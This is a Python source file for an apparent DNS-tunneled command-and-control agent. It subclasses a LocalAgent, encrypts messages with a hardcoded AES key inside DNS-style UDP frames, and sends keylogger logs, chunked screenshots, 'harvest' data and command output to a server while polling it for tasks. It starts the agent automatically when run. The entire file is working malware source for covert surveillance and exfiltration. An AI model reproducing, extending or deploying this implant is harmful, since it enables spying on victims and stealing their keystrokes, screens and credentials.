import os
import sys
import base64
import http.client
import json
import getpass
import ssl
import time
import subprocess
from pathlib import Path
import socket
import random
import secrets

import queue

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

from localAgent import LocalAgent

class DNSAgent(LocalAgent):
	hostname = socket.gethostname()
	pid = os.getpid()
	username = getpass.getuser()
    
	q = queue.Queue()

	def sendRecv(self, lhostname, lusername, lpid, lprotocol, lmessage):
		try:    
			if lmessage == '':
				lmessage = "<poll>"
			header = lhostname + "<spl>" + lusername + "<spl>" + str(lpid) + "<spl>" + lprotocol + "<spl>" + lmessage
			try:
				sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
				server_address = ('localhost', 8001)
            
				key = bytes([ 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16])
				iv = bytearray()#bytes([ 1, 2, 3, 4, 5, 6, 6, 5, 4, 3, 2, 1, 7, 7, 7, 7 ])#bytearray()#
				idx = 0
				while idx < 16:
					byte = secrets.token_bytes(1)[0]
					if byte > 127:
						byte = byte - 127
					if byte > 127:
						byte = byte - 127    
					iv.append(byte)
					idx = idx + 1
				cipher = AES.new(key, AES.MODE_CBC, iv=iv)
				headerbytes = bytes(header, 'ascii')
				padded = pad(headerbytes, AES.block_size)
				ct_bytes = cipher.encrypt(padded)
				"""
                print(iv[0])
				print(iv[1])
				print(iv[2])
				print(iv[3])
				print(iv[4])
				print(iv[5])
				print(iv[6])
				print(iv[7])
				print(iv[8])
				print(iv[9])
				print(iv[10])
				print(iv[11])
				print(iv[12])
				print(iv[13])
				print(iv[14])
				print(iv[15])                
				"""
				full_payload = iv + ct_bytes
				"""
                print(full_payload[0])
				print(full_payload[1])
				print(full_payload[2])
				print(full_payload[3])
				print(full_payload[4])
				print(full_payload[5])
				print(full_payload[6])
				print(full_payload[7])
				print(full_payload[8])
				print(full_payload[9])
				print(full_payload[10])
				print(full_payload[11])
				print(full_payload[12])
				print(full_payload[13])
				print(full_payload[14])
				print(full_payload[15])                
				"""
				im_b64 = base64.b64encode(full_payload).decode('ascii')
				frame = bytearray()
				frame.append(random.randbytes(1)[0])#UID1 random
				frame.append(random.randbytes(1)[0])#UID2 random
				frame.append(0x00)#op code 1
				frame.append(0x00)#op code 2
				frame.append(0x01)#question 1
				frame.append(0x00)#question 2
				idx = 6
				while idx < 12:
					frame.append(0x00)#We're not returning answers here, so this part of header is all 0
					idx = idx + 1
				frame.extend(bytes(im_b64, 'ascii'))    

    # Send data
				sent = sock.sendto(frame, server_address)
    # Receive response
				data, server = sock.recvfrom(2048000)
				data = data[12:]#discard the first 12 bytes of header
				data = base64.decodebytes(data)
				newiv = data[0:16]
				cipher = AES.new(key, AES.MODE_CBC, iv=newiv)
				payload = data[16:]#discard iv
				decoded_resp = cipher.decrypt(payload)
				#Implement our own PKCS7 decoder
				bytesToRemove = decoded_resp[len(decoded_resp) - 1]
				decoded_resp = decoded_resp[0:len(decoded_resp) - bytesToRemove]
				decoded_resp = str(decoded_resp, 'utf-8')
				if decoded_resp != '<discard>':
					self.q.put(decoded_resp)
			except Exception as e:
				print("Oops, something went wrong with transmission: {}".format(e), file=sys.stderr)                
			finally:
				sock.close()
		except Exception as e:
			print("Oops, something went wrong with sendrecv: {}".format(e), file=sys.stderr)

	def postKeylogger(self, log):
		transmission = "<keylogger>" + log
		self.postResponse(transmission)

	def postResponse(self, cmd_output):
		self.sendRecv(self.hostname, self.username, self.pid, "DNS", cmd_output + os.linesep)
        
	def postScreenshot(self, cmd_output):
		if len(cmd_output) < 500:
			transmission = "<screenshot><final>"
			transmission = transmission + cmd_output
			self.sendRecv(self.hostname, self.username, self.pid, "DNS", transmission)
		else:
			idx = 0
			while idx < len(cmd_output):
				transmission = "<screenshot>"
				t_len = 500
				if len(cmd_output) - idx < t_len:
					#t_len = len(cmd_output) - idx
					transmission = transmission + "<final>" + cmd_output[idx:]
				else:
					transmission = transmission + cmd_output[idx:idx + t_len]  
					#print(cmd_output[0:1000])
					#print(transmission)
				#if idx > 1000:
				#	time.sleep(60)
					#print("Transmitting")
				self.sendRecv(self.hostname, self.username, self.pid, "DNS", transmission)
				time.sleep(0.05)
				idx = idx + t_len
#				System.Threading.Thread.Sleep(50);                    
#				idx = idx + 500
#				for (int idx = 0; idx < content.Length; idx = idx + 500) {
#					string transmission = "<screenshot>";
#					int len = 500;
#					if (content.Length - idx < len) {
#						len = content.Length - idx;
#						//TODO: make some sort of UID for transaction so server can receive in parallel,
#						//the introduce a delay in transmission
#						transmission += "<final>";
#					}
#					transmission += content.Substring(idx, len);
#					PostResults(transmission, hostname, username, pid, protocol);
#					System.Threading.Thread.Sleep(50);
#				}
			

	def postHarvest(self, cmd_output, harvestType):
		transmission = "<harvest><" + harvestType + ">"
		transmission = transmission + cmd_output
		self.postResponse(transmission);
	
	def pollServer(self):
		if not self.q.empty():
			return self.q.get()
		self.sendRecv(self.hostname, self.username, self.pid, "DNS", "<poll>")
		if self.q.empty():
			return "<NO RESP>"
		else:
			return self.q.get()        


try:
	agent = DNSAgent()
	agent.run(False, False)
except Exception as e:
	print("Oops, something went wrong: {}".format(e), file=sys.stderr)    